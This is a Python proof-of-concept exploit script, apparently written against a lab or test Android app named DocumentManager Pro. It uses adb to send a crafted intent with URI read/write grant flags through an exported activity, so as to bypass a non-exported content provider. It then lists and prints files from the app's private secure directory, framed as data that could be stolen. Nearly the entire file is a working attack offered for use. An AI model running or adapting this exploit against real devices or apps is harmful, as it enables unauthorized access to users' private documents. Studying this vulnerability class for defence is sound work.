#!/usr/bin/env python3
"""
Grant URI Permission Escalation exploit for DocumentManager Pro (ben75).
Bypasses non-exported content provider using URI permission grant flags.
"""

import subprocess
import json

def run_adb_command(cmd):
    """Run an ADB command and return the output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), 1

def exploit_uri_permission_escalation():
    """Launch the URI permission escalation exploit."""
    print("🎯 Launching URI Permission Escalation exploit...")
    
    # Malicious workflow intent with URI permission flags
    exploit_payload = {
        "action": "android.intent.action.VIEW",
        "data": "content://com.documentmanager.secure/documents",
        "flags": [
            "FLAG_GRANT_READ_URI_PERMISSION",
            "FLAG_GRANT_WRITE_URI_PERMISSION"
        ]
    }
    
    cmd = f'''adb shell am start -n com.documentmanager/.IntentProcessorActivity --es workflow_intent '{json.dumps(exploit_payload)}' '''
    
    print(f"🚀 Payload: {json.dumps(exploit_payload)}")
    stdout, stderr, code = run_adb_command(cmd)
    
    if code == 0:
        print("✅ Exploit sent successfully")
        return True
    else:
        print(f"❌ Exploit failed: {stderr}")
        return False

def show_sensitive_data():
    """Show what sensitive data could be stolen."""
    print("\n💰 Demonstrating sensitive files that could be stolen:")
    cmd = 'adb shell "run-as com.documentmanager ls -la /data/data/com.documentmanager/files/secure/"'
    stdout, stderr, code = run_adb_command(cmd)
    
    if code == 0:
        print(stdout)
        
        # Show sample content
        cmd2 = 'adb shell "run-as com.documentmanager head -5 /data/data/com.documentmanager/files/secure/Financial_Report_Q4_2024.pdf"'
        stdout2, stderr2, code2 = run_adb_command(cmd2)
        
        if code2 == 0:
            print("\n🔥 Sample sensitive content:")
            print(stdout2)

def main():
    print("🔥 Grant URI Permission Escalation - Ben75")
    print("=" * 50)
    
    # Test direct access (should fail)
    print("\n🔒 Testing direct access...")
    cmd = 'adb shell content query --uri content://com.documentmanager.secure/documents'
    _, stderr, code = run_adb_command(cmd)
    
    if "SecurityException" in stderr or code != 0:
        print("✅ Content provider blocked (as expected)")
    else:
        print("❌ Content provider accessible (unexpected)")
    
    # Launch exploit
    if exploit_uri_permission_escalation():
        print("\n🎉 Vulnerability exploited!")
        print("📊 Check logs: adb logcat | grep DocumentProcessor")
        
        # Show sensitive data that could be stolen
        show_sensitive_data()
    
    print("\n📋 Attack Summary:")
    print("Uses exported IntentProcessorActivity to bypass non-exported")
    print("DocumentContentProvider via workflow_intent URI permission grants.")

if __name__ == "__main__":
    main()
